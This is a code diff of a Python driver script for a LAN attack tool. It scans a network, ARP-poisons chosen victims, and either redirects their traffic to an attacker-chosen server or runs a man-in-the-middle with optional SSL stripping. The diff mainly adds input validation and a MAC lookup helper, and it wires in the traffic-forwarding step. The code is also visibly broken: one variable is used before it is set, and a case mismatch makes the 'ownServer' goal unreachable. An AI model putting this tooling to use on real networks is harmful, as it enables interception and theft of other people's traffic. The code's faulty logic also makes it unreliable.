@@ -1,6 +1,9 @@
 import ARPpoisoning as ArpPoisen;
 import sslStripping as sslStripping;
 import scapy.all as sc;
+import re
+import ipaddress
+
 victimIP = ""
 serverIP = ""
 victimMac = ""
@@ -11,22 +14,55 @@ attackerMac = sc.get_if_hwaddr(sc.conf.iface)
 
 def main():
     while True:
-        ipt = input("Enter a command: Scan, ARP, quit: ").strip().lower()
+        ipt = ""
+        ip_range = ""
+        targets = ""
+        goal = ""
+        sslStrip = ""
+        ownServerIp = ""
+        while (ipt != "scan" and  ipt != "arp" and ipt != "quit"):
+            if (ipt != ""):
+                print("Invalid input, please try again")
+            ipt = input("Enter a command: Scan, ARP, quit: ").strip().lower()
 
         if ipt == "scan":
-            ip_range = input("Enter ip range").strip().lower()
-            hosts = ArpPoisen.network_scan(ip_range)
-            for host in hosts:
-                print(host)
+            while (not is_cidr_range(ip_range)):
+                if (ip_range != ""):
+                    print("Invalid input, please try again")
+                ip_range = input("Enter ip range in CIDR notation: ").strip().lower()
+            scan(ip_range)
+
         elif ipt == "arp":
-            targets = input("Enter 'victim ip, server ip' Can both be none").strip().lower()
-            goal = input("Enter a goal: mitm, ownServer").strip().lower()
+            while (not is_valid_ip_pair(targets)):
+                if (targets != ""):
+                    print("Invalid input, please try again")
+                targets = input("Enter 'victim ip, server ip'. Server ip can be 'none' or both can be 'none: ").strip().lower()
             parts = [p.strip() for p in targets.split(',')]
+
+            while (silent != "silent" and silent != "allout"):
+                if (silent != ""):
+                    print("Invalid input, please try again")
+                silent = input("Enter 'silent' or 'allOut': ").strip().lower()
+
+            while (goal != "mitm" and goal != "ownServer"):
+                if (goal != ""):
+                    print("Invalid input, please try again") 
+                goal = input("Enter a goal: 'mitm' or 'ownServer': ").strip().lower()
+            ownServerMac = ""
+
+
             if goal == "ownserver":
-                ownServer = input("Enter a ip adress to reroute victim to").strip().lower()
+                while (not is_ipv4_address(ownServerIp)):
+                    if (ownServerIp != ""):
+                        print("Invalid input, please try again")                    
+                    ownServerIp = input("Enter a ip adress to reroute victim to: ").strip().lower()
+                ownServerMac = get_mac(ownServerIp)
                     
             elif goal == "mitm":
-                sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
+                while (sslStrip != "yes" and sslStrip != "no" and sslStrip != "y" and sslStrip != "n"):
+                    if (sslStrip != ""):
+                        print("Invalid input, please try again")                    
+                    sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
             
             if len(parts) == 2:
                 victim_ip = parts[0] if parts[0] != "none" else None
@@ -38,7 +74,7 @@ def main():
                     if pkt.haslayer(sc.ARP):
                         arp = pkt[sc.ARP]
                         if arp.op == 1 and arp.psrc == victim_ip:
-                            serverMac, victimMac = ArpPoisen.arp_poisonening(victim_ip, arp.pdst)
+                            serverMac, victimMac = ArpPoisen.arp_poisoning(victim_ip, arp.pdst)
                             
                 
                 if (victim_ip is None and server_ip is None):
@@ -46,16 +82,15 @@ def main():
                     if pkt.haslayer(sc.ARP):
                         arp = pkt[sc.ARP]
                         if arp.op == 1:
-                            serverMac, victimMac = ArpPoisen.arp_poisonening(arp.psrc, arp.pdst)
+                            serverMac, victimMac = ArpPoisen.arp_poisoning(arp.psrc, arp.pdst)
                 	
                 print(f"Victim IP: {victim_ip}")
                 print(f"Server IP: {server_ip}")
-                serverMac, victimMac = ArpPoisen.arp_poisonening(victimIP, serverIP)
 
-                ownServer = ""
-                sslStrip = ""
+                serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, serverIP)
+
                 if goal == "ownserver":
-                    #now reroute to other website
+                    sslStripping.forward(victim_ip, victimMac, ownServerIp, ownServerMac, attackerIP, attackerMac)
                     return
                     
                 elif goal == "mitm":
@@ -75,6 +110,60 @@ def main():
             break
         else:
             print("Unknown command. Try again.")
+
+
+def get_mac(ip):
+    # Create ARP request packet
+    arp_request = sc.ARP(pdst=ip)
+    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+
+    # Send the packet and receive the response
+    answered_list = sc.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+
+    # Parse response
+    for sent, received in answered_list:
+        return received.hwsrc  # MAC address
+
+    return None
+
+def scan(ip_range):
+    hosts = ArpPoisen.network_scan(ip_range)
+    for host in hosts:
+        print(host)
+    return
+
+
+
+def is_valid_ip_pair(s):
+    # Define regex for a valid IP address
+    ip_pattern = r"(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(?!$)){3}(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)"
+
+    # Full patterns to match
+    full_ip = rf"^{ip_pattern},\s*{ip_pattern}$"
+    ip_none = rf"^{ip_pattern},\s*none$"
+    none_none = r"^none,\s*none$"
+
+    return bool(
+        re.match(full_ip, s) or
+        re.match(ip_none, s) or
+        re.match(none_none, s)
+    )
+
+def is_cidr_range(s):
+    try:
+        # Check if it's a valid IPv4 network
+        ipaddress.IPv4Network(s, strict=False)
+        return True
+    except ValueError:
+        return False
+    
+def is_ipv4_address(s):
+    try:
+        ipaddress.IPv4Address(s)
+        return True
+    except ValueError:
+        return False
 
 if __name__ == "__main__":
     main()
